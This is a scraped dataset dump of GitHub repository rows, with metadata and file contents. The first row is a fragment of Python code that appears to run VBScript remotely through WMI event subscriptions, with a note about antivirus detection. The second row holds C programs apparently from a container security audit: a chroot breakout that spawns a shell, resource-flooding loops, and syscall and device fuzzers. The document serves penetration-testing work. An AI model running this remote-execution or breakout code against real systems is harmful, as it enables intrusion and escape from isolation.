self.logger.debug(""{} - ERROR: {} (0x{:08x})"".format(banner, error_name, call_status))\n        else:\n            self.logger.debug(f""{banner} - OK"")\n\n    def execute_vbs(self, vbs_content):\n        # Copy from wmipersist.py\n        # Install ActiveScriptEventConsumer\n        activeScript, _ = self.__iWbemServices.GetObject(\'ActiveScriptEventConsumer\')\n        activeScript = activeScript.SpawnInstance()\n        activeScript.Name = self.__instanceID\n        activeScript.ScriptingEngine = \'VBScript\'\n        activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]\n        activeScript.ScriptText = vbs_content\n        # Don\'t output impacket default verbose\n        current=sys.stdout\n        sys.stdout = StringIO()\n        resp = self.__iWbemServices.PutInstance(activeScript.marshalMe())\n        sys.stdout = current\n        self.checkError(f\'Adding ActiveScriptEventConsumer.Name=""{self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        # Timer means the amount of milliseconds after the script will be triggered, hard coding to 1 second it in this case.\n        wmiTimer, _ = self.__iWbemServices.GetObject(\'__IntervalTimerInstruction\')\n        wmiTimer = wmiTimer.SpawnInstance()\n        wmiTimer.TimerId = self.__instanceID\n        wmiTimer.IntervalBetweenEvents = 1000\n        #wmiTimer.SkipIfPassed = False\n        # Don\'t output verbose\n        current=sys.stdout\n        sys.stdout = StringIO()\n        resp = self.__iWbemServices.PutInstance(wmiTimer.marshalMe())\n        sys.stdout = current\n        self.checkError(f\'Adding IntervalTimerInstruction.TimerId=""{self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        # EventFilter\n        eventFilter,_ = self.__iWbemServices.GetObject(\'__EventFilter\')\n        eventFilter =  eventFilter.SpawnInstance()\n        eventFilter.Name = self.__instanceID\n        eventFilter.CreatorSID =  [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]\n        eventFilter.Query = f\'select * from __TimerEvent where TimerID = ""{self.__instanceID}"" \'\n        eventFilter.QueryLanguage = \'WQL\'\n        eventFilter.EventNamespace = r\'root\\subscription\'\n        # Don\'t output verbose\n        current=sys.stdout\n        sys.stdout = StringIO()\n        resp = self.__iWbemServices.PutInstance(eventFilter.marshalMe())\n        sys.stdout = current\n        self.checkError(f\'Adding EventFilter.Name={self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        # Binding EventFilter & EventConsumer\n        filterBinding, _ = self.__iWbemServices.GetObject(\'__FilterToConsumerBinding\')\n        filterBinding = filterBinding.SpawnInstance()\n        filterBinding.Filter = f\'__EventFilter.Name=""{self.__instanceID}""\'\n        filterBinding.Consumer = f\'ActiveScriptEventConsumer.Name=""{self.__instanceID}""\'\n        filterBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]\n        # Don\'t output verbose\n        current=sys.stdout\n        sys.stdout = StringIO()\n        resp = self.__iWbemServices.PutInstance(filterBinding.marshalMe())\n        sys.stdout = current\n        self.checkError(fr\'Adding FilterToConsumerBinding.Consumer=""ActiveScriptEventConsumer.Name=\\""{self.__instanceID}\\"""", Filter=""__EventFilter.Name=\\""{self.__instanceID}\\""""\', resp.GetCallStatus(0) & 0xffffffff)\n\n    def get_CommandResult(self):\n        try:\n            command_ResultObject, _ = self.__iWbemServices.GetObject(f\'ActiveScriptEventConsumer.Name=""{self.__instanceID_StoreResult}""\')\n            record = dict(command_ResultObject.getProperties())\n            self.__outputBuffer = base64.b64decode(record[\'ScriptText\'][\'value\']).decode(self.__codec, errors=\'replace\')\n        except Exception as e:\n            self.logger.fail(f\'WMIEXEC-EVENT: Get output file error, maybe command not executed successfully or got detected by AV software, please increase the interval time of command execution with ""--interval-time"" option. If it\\\'s still failing maybe something is blocking the schedule job in vbscript, try another exec method\')\n\n    def remove_Instance(self):\n        if self.__retOutput:\n            resp = self.__iWbemServices.DeleteInstance(f\'ActiveScriptEventConsumer.Name=""{self.__instanceID_StoreResult}""\')\n            self.checkError(f\'Removing ActiveScriptEventConsumer.Name=""{self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        resp = self.__iWbemServices.DeleteInstance(f\'ActiveScriptEventConsumer.Name=""{self.__instanceID}""\')\n        self.checkError(f\'Removing ActiveScriptEventConsumer.Name=""{self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        resp = self.__iWbemServices.DeleteInstance(f\'__IntervalTimerInstruction.TimerId=""{self.__instanceID}""\')\n        self.checkError(f\'Removing IntervalTimerInstruction.TimerId=""{self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        resp = self.__iWbemServices.DeleteInstance(f\'__EventFilter.Name=""{self.__instanceID}""\')\n        self.checkError(f\'Removing EventFilter.Name=""{self.__instanceID}""\', resp.GetCallStatus(0) & 0xffffffff)\n\n        resp = self.__iWbemServices.DeleteInstance(fr\'__FilterToConsumerBinding.Consumer=""ActiveScriptEventConsumer.Name=\\""{self.__instanceID}\\"""",Filter=""__EventFilter.Name=\\""{self.__instanceID}\\""""\')\n        self.checkError(fr\'Removing FilterToConsumerBinding.Consumer=""ActiveScriptEventConsumer.Name=\\""{self.__instanceID}\\"""", Filter=""__EventFilter.Name=\\""{self.__instanceID}\\""""\', resp.GetCallStatus(0) & 0xffffffff)'}",{},{},{},{},{},{},{},rejected,2023-11-07 19:43:17.054637
public-pentesting-reports,https://github.com/juliocesarfort/public-pentesting-reports,A list of public penetration test reports published by several consulting firms and academic security groups.,7687,1867,2023-11-07 13:42:30+00:00,2016-08-05 13:11:22+00:00,juliocesarfort,User,https://github.com/juliocesarfort,[],"{'CSS': 23715, 'C': 7447, 'JavaScript': 1022, 'Makefile': 630, 'Shell': 377}",36,193,1,0,master,487,21,,702861,{},{},{},"{'sidebar-lang.js': '//@license magnet:?xt=urn:btih:0b31508aeb0634b347b8270c7bee4d411b5d4109&dn=agpl-3.0.txt AGPL-v3\n\n/**\n * When the user changes the language via the language drop down, redirect the user to the relevant translation.\n */\n(function() {\n    var chooser = document.getElementById(\'language-chooser-select\');\n    chooser.onchange = function() {\n        var lang = this.value;\n        var activeLang = \'en\';\n        var pageUrl = \'/\';\n\n        /*\n         * If we are already on ""/fr"" and select ""ES"", we don\'t want to redirect to ""/fr/es"".\n         * The apache docs website achieves this via AliasMatch in their apache config, but that\n         * is not able to go into the .htaccess file and so makes the deployment of the site more\n         * difficult. This solves the problem in JavaScript.\n         */\n        if (new RegExp(\'^\' + activeLang + \'/\').test(pageUrl)) {\n            pageUrl = pageUrl.substring(activeLang.length + 1);\n        }\n\n        document.location = \'\' + \'/\' + lang + pageUrl;\n    }\n})();\n// @license-end'}",{},"{'breakout.c': '#include <unistd.h>\n#include <sys/stat.h>\n\nint main(void)\n{\n\tmkdir(""x"", 0700);\n\tchroot(""x"");\n\tchdir(""../../../../../../../../../../.."");\n\tchroot(""."");\n\texecl(""/bin/sh"", ""sh"", 0);\n\treturn 1;\n}\n', 'closeall.c': '#include <unistd.h>\n#include <errno.h>\n\n#ifdef __linux__\n#include <linux/limits.h>\n#else\n#define NR_OPEN 1024\n#endif\n\nint close_all(void)\n{\n\tint fd, max, err;\n\n\tmax = sysconf(_SC_OPEN_MAX);\n\terr = max <= 0;\n\n\tif (max < NR_OPEN)\n\t\tmax = NR_OPEN;\n\n\tfor (fd = 3; fd < max; fd++)\n\t\terr |= close(fd) && errno != EBADF;\n\n\treturn -err;\n}\n', 'devfuzzer.c': '#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n\n#define DEVNAME ""tmpdev""\n\nstatic void fuzzer(mode_t type)\n{\n\tmode_t mode = type | (S_IRUSR | S_IWUSR);\n\tunsigned int major, minor;\n\tint retval, saved_errno;\n\n\tunlink(DEVNAME);\n\n\tfor (major = 0; major < 1024; major++)\n\tfor (minor = 0; minor < 256; minor++) {\n\t\tretval = mknod(DEVNAME, mode, makedev(major, minor));\n\t\tif (retval == -1) {\n\t\t\tsaved_errno = errno;\n\t\t\tunlink(DEVNAME);\n\t\t\tprintf(""mknod %c %u %u = -1 errno=%d (\\""%s\\"")\\n"",\n\t\t\t\t""cb""[type == S_IFBLK], major, minor,\n\t\t\t\tsaved_errno, strerror(saved_errno));\n\t\t\tcontinue;\n\t\t}\n\n\t\tretval = open(DEVNAME, O_RDONLY | O_NOCTTY);\n\t\tsaved_errno = errno;\n\t\tunlink(DEVNAME);\n\t\tif (retval >= 0)\n\t\t\tclose(retval);\n\n\t\tprintf(""open %c %u %u = %d"",\n\t\t\t""cb""[type == S_IFBLK], major, minor, retval);\n\t\tif (retval == -1)\n\t\t\tprintf("" errno=%d (\\""%s\\"")"",\n\t\t\t\tsaved_errno, strerror(saved_errno));\n\t\tputchar(\'\\n\');\n\t}\n}\n\nint main(void)\n{\n\tfuzzer(S_IFCHR);\n\tfuzzer(S_IFBLK);\n\treturn 0;\n}\n', 'eechecker1.c': '#define MODULE\n#define __KERNEL__\n#define _LOOSE_KERNEL_NAMES\n#define __SMP__\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/sched.h>\n\n#define WATCHPID 20538\n\nint init_module(void)\n{\n\tstruct task_struct *task;\n\tunsigned int i;\n\n\ttask = find_task_by_pid_ve(WATCHPID);\n\tif (!task)\n\t\treturn -ESRCH;\n\n\tfor (i = 0; i < 0x10000000; i++) {\n\t\trmb();\n\t\tif (ve_is_super(VE_TASK_INFO(task)->exec_env)) {\n\t\t\tprintk(""ve_is_super at %u\\n"", i);\n\t\t\treturn -EEXIST;\n\t\t}\n\t}\n\n\treturn -EAGAIN;\n}\n\nvoid cleanup_module(void)\n{\n}\n\n#include <linux/vermagic.h>\n\n// MODULE_INFO(vermagic, VERMAGIC_STRING);\nMODULE_LICENSE(""GPL"");\n\nstruct module __this_module\n__attribute__((section("".gnu.linkonce.this_module""))) = {\n\t.name = ""exec_env_checker"",\n\t.init = init_module,\n\t.exit = cleanup_module\n};\n', 'eechecker2.c': '#define MODULE\n#define __KERNEL__\n#define _LOOSE_KERNEL_NAMES\n#define __SMP__\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/sched.h>\n\nint init_module(void)\n{\n\tstruct task_struct *task;\n\n\tfor_each_process_all(task) {\n\t\tprintk(""pid=%u ve_task_info=%p exec_env=%p ""\n\t\t\t""task_bc=%p exec_ub=%p\\n"",\n\t\t\ttask->pid,\n\t\t\tVE_TASK_INFO(task),\n\t\t\tVE_TASK_INFO(task)->exec_env,\n\t\t\ttask_bc(task),\n\t\t\ttask_bc(task)->exec_ub);\n\t}\n\n\treturn -EAGAIN;\n}\n\nvoid cleanup_module(void)\n{\n}\n\n#include <linux/vermagic.h>\n\n// MODULE_INFO(vermagic, VERMAGIC_STRING);\nMODULE_LICENSE(""GPL"");\n\nstruct module __this_module\n__attribute__((section("".gnu.linkonce.this_module""))) = {\n\t.name = ""exec_env_checker"",\n\t.init = init_module,\n\t.exit = cleanup_module\n};\n', 'iflood.c': '#include <stdio.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/ioctl.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <net/if.h>\n\nint main(void)\n{\n\tint sock;\n\tstruct ifreq ifr;\n\tuint32_t addr;\n\n\tif ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0) {\n\t\tperror(""socket"");\n\t\treturn 1;\n\t}\n\n\tmemset(&ifr, 0, sizeof(ifr));\n\tifr.ifr_flags = IFF_UP | IFF_POINTOPOINT | IFF_RUNNING | IFF_NOARP;\n\tifr.ifr_addr.sa_family = AF_INET;\n\n\tfor (addr = 1; addr < 0x01000000; addr++) {\n\t\tsprintf(ifr.ifr_name, ""venet0:%u"", addr);\n\t\t((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr = htonl(addr);\n\t\tif ((addr & 0xff) == 0)\n\t\t\tprintf(""%s\\n"", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));\n\t\tif (ioctl(sock, SIOCSIFADDR, &ifr) < 0)\n\t\t\tperror(""ioctl"");\n\t}\n\n\treturn 0;\n}\n', 'mntflood.c': '#include <stdio.h>\n#include <sys/mount.h>\n\nint main(void)\n{\n\twhile (1) {\n\t\tif (mount(""/root"", ""/mnt"", ""bind"", MS_MGC_VAL|MS_BIND, NULL))\n\t\t\tperror(""mount"");\n\t}\n\n\treturn 0;\n}\n', 'rtflood.c': '#include <stdio.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/ioctl.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <net/route.h>\n\nint main(void)\n{\n\tint sock;\n\tstruct rtentry rt;\n\tuint32_t addr;\n\n\tif ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {\n\t\tperror(""socket"");\n\t\treturn 1;\n\t}\n\n\tmemset(&rt, 0, sizeof(rt));\n\trt.rt_flags = RTF_UP | RTF_HOST;\n\trt.rt_dev = ""venet0"";\n\trt.rt_dst.sa_family = AF_INET;\n\n\tfor (addr = 0; addr < 0x01000000; addr++) {\n\t\t((struct sockaddr_in *)&rt.rt_dst)->sin_addr.s_addr = htonl(addr);\n\t\tif ((addr & 0xff) == 0)\n\t\t\tprintf(""%s\\n"", inet_ntoa(((struct sockaddr_in *)&rt.rt_dst)->sin_addr));\n\t\tif (ioctl(sock, SIOCADDRT, &rt) < 0)\n\t\t\tperror(""ioctl"");\n\t}\n\n\treturn 0;\n}\n', 'sched_fifo.c': '#include <stdio.h>\n#include <unistd.h>\n#include <sched.h>\n\nint main(int argc, char **argv)\n{\n\tstruct sched_param param;\n\n\tif (argc < 2) {\n\t\tprintf(""Usage: %s COMMAND\\n"", argv[0]);\n\t\treturn 1;\n\t}\n\n\tparam.sched_priority = 1;\n\tif (sched_setscheduler(getpid(), SCHED_FIFO, &param)) {\n\t\tperror(""sched_setscheduler"");\n\t\treturn 1;\n\t}\n\n\texecv(argv[1], argv + 1);\n\n\tperror(""execv"");\n\treturn 1;\n}\n', 'sched_rr.c': '#include <stdio.h>\n#include <unistd.h>\n#include <sched.h>\n\nint main(int argc, char **argv)\n{\n\tstruct sched_param param;\n\n\tif (argc < 2) {\n\t\tprintf(""Usage: %s COMMAND\\n"", argv[0]);\n\t\treturn 1;\n\t}\n\n\tparam.sched_priority = 1;\n\tif (sched_setscheduler(getpid(), SCHED_RR, &param)) {\n\t\tperror(""sched_setscheduler"");\n\t\treturn 1;\n\t}\n\n\texecv(argv[1], argv + 1);\n\n\tperror(""execv"");\n\treturn 1;\n}\n', 'sockanysniff.c': '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/socket.h>\n\nstatic void print_data(unsigned char *data, int count)\n{\n\tint i;\n\n\tfor (i = 0; i < count; i++) {\n\t\tprintf(""%02x%c"", (int)data[i],\n\t\t\ti < count - 1 && i % 24 != 23 ? \' \' : \'\\n\');\n\t}\n}\n\nint main(int argc, char **argv)\n{\n\tchar buffer[1600];\n\tint in, size;\n\n\tif (argc != 4) return 1;\n\n\tif ((in = socket(atoi(argv[1]), atoi(argv[2]), atoi(argv[3]))) < 0) {\n\t\tperror(""socket"");\n\t\treturn 1;\n\t}\n\n\tsetbuf(stdout, NULL);\n\n\talarm(1);\n\n\twhile (1) {\n\t\tsize = read(in, buffer, sizeof(buffer));\n\t\tprint_data(buffer, size);\n\t}\n}\n', 'sysfuzzer.c': '#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#include <linux/unistd.h>\n\nstatic long sys_any(long num, long args[5])\n{\n\t#define __NR_any5 num\n\t_syscall5(long, any5,\n\t\tlong, arg1, long, arg2, long, arg3, long, arg4, long, arg5);\n\n\treturn any5(args[0], args[1], args[2], args[3], args[4]);\n}\n\nstatic void fuzzer(void)\n{\n\tlong args[5];\n\tlong num, retval;\n\n\tmemset(args, 0, sizeof(args));\n\n\tfor (num = 0; num < 1024; num++) {\n\t\tswitch (num) {\n\t\tcase __NR_exit:\n\t\tcase __NR_fork:\n\t\tcase __NR_pause:\n\t\tcase __NR_sigsuspend:\n\t\tcase __NR_sigreturn:\n\t\tcase __NR_clone:\n\t\tcase __NR__newselect:\n\t\tcase __NR_rt_sigreturn:\n\t\tcase __NR_vfork:\n\t\tcase __NR_exit_group:\n\t\t\t/* harmful to the fuzzer, but no VPS specifics */\n\t\t\tcontinue;\n\t\tcase __NR_reboot:\n\t\tcase __NR_vhangup:\n\t\t\t/* source code audit only, no fuzzing */\n\t\t\tcontinue;\n\t\t}\n\t\tretval = sys_any(num, args);\n\t\tprintf(""SYS_%ld() = %ld"", num, retval);\n\t\tif (retval == -1)\n\t\t\tprintf("" errno=%d (\\""%s\\"")"", errno, strerror(errno));\n\t\tputchar(\'\\n\');\n\t}\n}\n\nint main(void)\n{\n\tsetbuf(stdout, NULL);\n\tfuzzer();\n\treturn 0;\n}\n', 'trivmount.c': '#include <stdio.h>\n#include <sys/mount.h>\n\nint main(int argc, char **argv)\n{\n\tif (argc != 4) return 1;\n\n\tif (mount(argv[1], argv[2], argv[3], MS_MGC_VAL, NULL))\n\t\tperror(""mount"");\n\n\treturn 0;\n}\n'}",{},{},accepted,2023-11-07 19:43:36.867975
